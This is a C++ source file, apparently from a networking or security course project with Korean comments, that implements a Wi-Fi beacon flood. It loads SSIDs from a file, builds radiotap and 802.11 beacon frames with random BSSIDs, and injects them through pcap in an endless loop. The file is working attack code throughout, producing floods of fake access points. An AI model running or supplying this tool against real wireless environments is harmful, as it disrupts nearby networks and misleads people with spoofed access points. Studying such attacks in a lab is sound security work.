#include "beacon_flood.h"
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstring>
#include <cstdlib>
#include <unistd.h>   // for usleep
#include <pcap.h>

#include <iomanip>   // for setw, setfill
#include <sstream>   // for stringstream

#include "radiotap.h"
#include "beaconframe.h"
#include "tagedparam.h"

using namespace std;

string mac_to_string(const uint8_t mac[6]) {
    stringstream ss;
    ss << hex << setw(2) << setfill('0') << (int)mac[0];
    for (int i = 1; i < 6; i++) {
        ss << ":" << setw(2) << setfill('0') << (int)mac[i];
    }
    return ss.str();
}


vector<string> load_ssid_list(const string &filename) {
    vector<string> ssids;
    ifstream ifs(filename);
    if (!ifs.is_open()) {
        cerr << "Failed to open SSID list file: " << filename << endl;
        return ssids;
    }

    string line;
    while (getline(ifs, line)) {
        if (!line.empty()) {
            ssids.push_back(line);
        }
    }
    return ssids;
}

void start_beacon_flood(const string &ifname,
                        const vector<string> &ssids)
{
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(ifname.c_str(), 1024, 1, 1000, errbuf);
    if (!handle) {
        cerr << "pcap_open_live(" << ifname << ") failed: " << errbuf << endl;
        return;
    }

    RadiotapHeader radiotap;
    BeaconFrameHeader beacon;

    DSParameterSet ds;
    SupportedRates rates;

    while (true) {
        for (auto &ssid : ssids) {
            // 1) Radiotap 헤더
            vector<uint8_t> packet = radiotap.toBytes();

            // 2) 802.11 Beacon 헤더
            vector<uint8_t> beacon_hdr = beacon.toBytes();
            packet.insert(packet.end(), beacon_hdr.begin(), beacon_hdr.end());

            // 3) SSID 태그 (Tag=0, Length=SSID 길이, SSID 자체)
            packet.push_back(0x00); // Tag Number (SSID)
            packet.push_back(static_cast<uint8_t>(ssid.size())); // Length
            for (char c : ssid) {
                packet.push_back(static_cast<uint8_t>(c));
            }

            // 4) DS Parameter, Supported Rates 태그
            auto ds_bytes = ds.toBytes();
            packet.insert(packet.end(), ds_bytes.begin(), ds_bytes.end());

            auto rates_bytes = rates.toBytes();
            packet.insert(packet.end(), rates_bytes.begin(), rates_bytes.end());

            beacon.setRandomBssid(); // Random BSSID

            // 5) 전송
            if (pcap_sendpacket(handle, packet.data(), packet.size()) != 0) {
                cerr << "[!] pcap_sendpacket error: "
                          << pcap_geterr(handle) << endl;
            } else {
                string bssidStr = beacon.getBssidString();
                cout << "[DEBUG] Sent Beacon: BSSID=" << bssidStr
                        << ", SSID=" << ssid << endl;
            }
        }
        usleep(10000); // 10ms
    }

    pcap_close(handle);
}